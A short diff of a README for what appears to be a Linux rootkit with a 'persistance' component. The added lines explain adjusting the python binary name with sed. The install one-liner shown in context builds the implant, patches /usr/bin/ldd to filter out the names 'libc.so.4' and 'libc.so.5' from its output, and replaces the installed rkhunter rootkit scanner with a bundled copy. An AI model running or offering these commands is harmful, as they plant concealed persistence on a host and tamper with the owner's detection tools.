@@ -17,6 +17,10 @@ SCTP was found...
 Sstrip was found...
 Configuration successful!
 ```
+Initially this was built on Debian which has a python binary of 'python3'. If your distro uses 'python' or another name you can use something like this to complete the configuration:
+```
+sed -i 's/python3/python/g' persistance/libexec.c
+```
 Then you can build and install it like this:
 ```
 make install clean && cd persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
